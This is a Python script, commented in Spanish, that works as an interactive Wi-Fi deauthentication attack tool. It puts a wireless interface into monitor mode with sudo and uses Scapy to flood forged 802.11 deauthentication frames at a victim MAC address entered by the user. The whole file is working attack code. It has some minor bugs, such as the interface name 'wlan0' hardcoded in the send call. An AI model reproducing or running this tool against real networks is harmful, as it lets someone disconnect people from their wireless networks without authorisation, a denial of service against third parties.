from scapy.layers.dot11 import Dot11, Dot11Deauth
from scapy.all import *
import scapy
import subprocess
import os


def craftear_paquete_deauth(mac_cliente, mac_ap):

    # addr1 --> MAC víctima
    # addr2 --> MAC origen
    # addr3 --> MAC AP
    # Dot11Deauth --> Marcamos que se quiere enviar un paquete de desautentificación con motivo 7
    trama_wifi = Dot11(addr1 = mac_cliente, addr2 = mac_ap, addr3 = mac_ap)/Dot11Deauth(reason = 7)
    return trama_wifi

# Para que se ejecute solamente si se corre directamente el programa
if __name__ == "__main__":

    # Limpiar terminal
    os.system("clear")
    print("Elige ataque a realizar: \n")

    print("1. Desautenticación")
    
    opcion_ataque = input("Ataque: ")

    if(opcion_ataque == "1"):

        # Limpiar terminal
        os.system("clear")
        # Obtener interfaces (Linux)
        lista_interfaces = os.listdir('/sys/class/net/')
        
        z = 0
        print("Elige una interfaz de red: \n")
        
        # Filtramos aquellas que no son vlan
        for i,nombre in enumerate(lista_interfaces):
            
            if lista_interfaces[i][0:4] != 'wlan': 
                lista_interfaces.remove(lista_interfaces[i])
                i = i -1
                
        for i,nombre in enumerate(lista_interfaces):
           
                print(str(i + 1) + ". " + nombre)
            
                
        opcion_interfaz = input("\nInterfaz: ")
        interfaz = lista_interfaces[int(opcion_interfaz) - 1]
        
        # Especificamos la MAC del cliente y del AP
        
        mac_cliente = input("MAC de la victima: ")
        mac_ap = input("MAC del AP: ")

        # Configurar modo monitor en la interfaz 
        
        process = subprocess.Popen(['sudo','ip','link','set',interfaz,'down'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = process.communicate()
        if str(out) == "b''":
            print("Desconectando interfaz...")
        
        process = subprocess.Popen(['sudo','iw',interfaz,'set','monitor','none'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = process.communicate()
        if str(out) == "b''":
            print("Poniendo interfaz en modo monitor...")
        
        process = subprocess.Popen(['sudo','ip','link','set',interfaz,'up'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = process.communicate()
        if str(out) == "b''":
            print("Activando interfaz...")
        
        
        
                 
        paquete = RadioTap()/craftear_paquete_deauth(mac_cliente,mac_ap)
        print("Atacando...(Ctrl-C para parar)")
        sendp(paquete, inter=0.1,loop=1,iface = "wlan0",verbose=1)
            
        
    else:
        print("Valor incorrecto")
    
    process = subprocess.Popen(['sudo','ip','link','set',interfaz,'down'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = process.communicate()
    if str(out) == "b''":
            print("Desactivando interfaz...")
    
    process = subprocess.Popen(['sudo','iw',interfaz,'set','type','managed'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = process.communicate()
    if str(out) == "b''":
            print("Poniendo interfaz en modo normal...")
    
    process = subprocess.Popen(['sudo','ip','link','set',interfaz,'up'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    out, err = process.communicate()
    if str(out) == "b''":
            print("Activando interfaz...")
        
    